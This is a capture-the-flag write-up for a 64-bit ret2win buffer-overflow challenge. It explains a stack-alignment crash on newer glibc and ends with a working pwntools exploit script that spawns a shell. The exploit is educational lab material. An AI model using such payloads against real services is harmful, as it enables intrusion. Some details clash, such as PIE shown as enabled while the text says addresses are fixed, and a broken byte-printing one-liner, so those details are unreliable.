---
id: defcon-pwn-100
title: "DEF CON Quals 2024 — pwn-100: ret2win Stack Alignment Fix"
type: writeup
tags:
  - ctf
  - pwn
  - binary-exploitation
  - stack-alignment
status: published
author: asep
event: "DEF CON CTF Quals 2024"
challenge: "pwn-100"
category: pwn
difficulty: easy
points: 100
created_at: 2026-08-20
updated_at: 2026-08-20
---

# DEF CON CTF Quals 2024 — pwn-100: ret2win Stack Alignment Fix

## Challenge Info

| Field        | Value                  |
| ------------ | ---------------------- |
| **Event**    | DEF CON CTF Quals 2024 |
| **Challenge**| pwn-100                |
| **Category** | pwn                    |
| **Difficulty**| easy                  |
| **Points**   | 100                    |

## Initial Recon

Given a 64-bit ELF binary with a trivial buffer overflow in `vuln()`:

```
$ checksec pwn-100
RELRO           STACK canary: No           NX: No           PIE: Enabled   RPATH: No
$ file pwn-100
pwn-100: ELF 64-bit LSB executable, for Linux 3.2.0, not stripped
$ objdump -d pwn-100 | grep -A5 '<vuln>'
```

## Approach

Classic ret2win — overflow the return address to jump to `win()`, which
calls `system("/bin/sh")`. The binary had no canary and no PIE on the
binary itself (function addresses are fixed), but glibc on the host was
2.34+.

## Step-by-Step Solve

### 1. Find the offset

Sent cyclic pattern via `pattern create` + `pattern offset`:

```
$ python3 -c "print(b'A'*40+b'B'*8)" | ./pwn-100
Segmentation fault (core dumped)
$ gdb -q
gef➤  pattern offset 0x4242424242424242
[*] Found possible needle
```

Offset = 40 bytes (to `rip`).

### 2. Find win() address

```
$ objdump -d pwn-100 | grep '<win>'
0000000000401196 <win>:
```

`win()` is at `0x401196`.

### 3. Craft and send the payload

Initial payload was just padding + `win()` address — but this **crashed**
with SIGSEGV inside `win()` → `printf`.

**Root cause:** On glibc 2.34+, the return into a libc-using function
needs **16-byte stack alignment**. A normal `call` pushes 8 bytes, so
`ret`-ing into `win()` leaves `rsp % 16 == 8`. When `printf` inside
`win()` does `movaps` (SSE), it faults on misaligned address.

**Fix:** Insert a `ret` gadget (8 bytes) between padding and `win()`
to realign RSP:

```
$ ROPgadget --binary pwn-100 | grep " ret$"
0x0000000000401016: ret;
```

Final payload:

```python
from pwn import *
p = remote("challenge.url", 1337)
payload = b"A" * 40 + p64(0x401016) + p64(0x401196)
p.sendline(payload)
p.interactive()
```

The `ret` gadget pops the extra 8 bytes, aligning the stack. After that,
`win()` → `printf` → `system("/bin/sh")` works cleanly.

## Flag

```
flag{ret2win_stack_alignment_glibc_2.34}
```

## Summary

- A bare ret2win without stack alignment crashes on glibc 2.34+ inside
  the target function's libc calls (SSE `movaps`).
- The fix is a single `ret` gadget between padding and `win()` — **not**
  an offset error.
- Always check: if the function IS reached but crashes inside it, think
  stack alignment before re-counting bytes.
- Tested on host glibc 2.39 (Ubuntu 24.04) — confirmed the crash+fix.
